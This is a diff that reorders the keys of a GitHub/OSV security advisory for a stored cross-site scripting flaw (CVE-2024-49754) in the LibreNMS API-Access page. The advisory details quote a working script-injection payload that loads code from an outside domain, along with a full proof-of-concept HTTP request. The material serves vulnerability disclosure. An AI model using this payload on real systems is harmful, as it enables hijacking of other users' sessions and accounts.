@@ -1,49 +1,17 @@
 {
-  "id": "GHSA-gfwr-xqmj-j27v",
-  "summary": "LibreNMS has a stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/api-access.inc.php",
-  "details": "### Summary\n\nA Stored Cross-Site Scripting (XSS) vulnerability in the API-Access page allows authenticated users to inject arbitrary JavaScript through the \"token\" parameter when creating a new API token. This vulnerability can result in the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.\n\n### Details\n\nThe vulnerability occurs when creating a new API Token. An attacker can inject arbitrary JavaScript into the \"token\" parameter, which is then executed when the API Access page is visited. The payload is triggered twice\u2014once in the \"Token Hash\" column and once in the \"QR Code\" column.\n\nThe payload used to exploit this vulnerability is: `'\"><script/src=//15.rs></script>`\n\nNote: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.\n\nThe vulnerability is due to insufficient sanitization of the \"token_hash\" variable before it is output in the HTML. This is evident in the following lines of code:\n\nhttps://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L152\nhttps://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L153\n\n### PoC\n\n1. Create a new API token with the following payload in the \"token\" parameter: `'\"><script/src=//15.rs></script>`\n2. Save the token.\n3. Navigate to the API Access page.\n4. Observe that the injected script executes twice, once in the \"Token Hash\" column and once in the \"QR Code\" column.\n\n```http\nPOST /ajax_form.php HTTP/1.1\nHost: <your_host>\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CSRF-TOKEN: <your_token>\nX-Requested-With: XMLHttpRequest\nCookie: <your_cookie>\n\n_token=<your_token>&user_id=1&token='\"><script/src=//15.rs></script>&description=t'\"><script/src=//15.rs>&type=token-item-create\n```\n\n### Impact\n\nThe vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. This can lead to account compromise and enable unauthorized actions on behalf of the impacted users.",
-  "aliases": [
-    "CVE-2024-49754"
-  ],
-  "modified": "2024-11-15T21:09:42.689983Z",
-  "published": "2024-11-15T15:11:45Z",
-  "database_specific": {
-    "nvd_published_at": "2024-11-15T16:15:34Z",
-    "cwe_ids": [
-      "CWE-79"
-    ],
-    "severity": "HIGH",
-    "github_reviewed": true,
-    "github_reviewed_at": "2024-11-15T15:11:45Z"
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/librenms/librenms/security/advisories/GHSA-gfwr-xqmj-j27v"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-49754"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/librenms/librenms/commit/25988a937cbaebd2ba4c0517510206c404dfb359"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/librenms/librenms"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "last_known_affected_version_range": "<= 24.9.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-gfwr-xqmj-j27v/GHSA-gfwr-xqmj-j27v.json"
+      },
       "package": {
-        "name": "librenms/librenms",
         "ecosystem": "Packagist",
+        "name": "librenms/librenms",
         "purl": "pkg:composer/librenms/librenms"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -51,7 +19,8 @@
             {
               "fixed": "24.10.0"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -185,18 +154,49 @@
         "24.8.1",
         "24.9.0",
         "24.9.1"
-      ],
-      "database_specific": {
-        "last_known_affected_version_range": "<= 24.9.1",
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-gfwr-xqmj-j27v/GHSA-gfwr-xqmj-j27v.json"
-      }
+      ]
+    }
+  ],
+  "aliases": [
+    "CVE-2024-49754"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-11-15T15:11:45Z",
+    "nvd_published_at": "2024-11-15T16:15:34Z",
+    "severity": "HIGH"
+  },
+  "details": "### Summary\n\nA Stored Cross-Site Scripting (XSS) vulnerability in the API-Access page allows authenticated users to inject arbitrary JavaScript through the \"token\" parameter when creating a new API token. This vulnerability can result in the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.\n\n### Details\n\nThe vulnerability occurs when creating a new API Token. An attacker can inject arbitrary JavaScript into the \"token\" parameter, which is then executed when the API Access page is visited. The payload is triggered twice\u2014once in the \"Token Hash\" column and once in the \"QR Code\" column.\n\nThe payload used to exploit this vulnerability is: `'\"><script/src=//15.rs></script>`\n\nNote: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.\n\nThe vulnerability is due to insufficient sanitization of the \"token_hash\" variable before it is output in the HTML. This is evident in the following lines of code:\n\nhttps://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L152\nhttps://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L153\n\n### PoC\n\n1. Create a new API token with the following payload in the \"token\" parameter: `'\"><script/src=//15.rs></script>`\n2. Save the token.\n3. Navigate to the API Access page.\n4. Observe that the injected script executes twice, once in the \"Token Hash\" column and once in the \"QR Code\" column.\n\n```http\nPOST /ajax_form.php HTTP/1.1\nHost: <your_host>\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CSRF-TOKEN: <your_token>\nX-Requested-With: XMLHttpRequest\nCookie: <your_cookie>\n\n_token=<your_token>&user_id=1&token='\"><script/src=//15.rs></script>&description=t'\"><script/src=//15.rs>&type=token-item-create\n```\n\n### Impact\n\nThe vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. This can lead to account compromise and enable unauthorized actions on behalf of the impacted users.",
+  "id": "GHSA-gfwr-xqmj-j27v",
+  "modified": "2024-11-15T21:09:42.689983Z",
+  "published": "2024-11-15T15:11:45Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/librenms/librenms/security/advisories/GHSA-gfwr-xqmj-j27v"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-49754"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/librenms/librenms/commit/25988a937cbaebd2ba4c0517510206c404dfb359"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/librenms/librenms"
     }
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "LibreNMS has a stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/api-access.inc.php"
 }
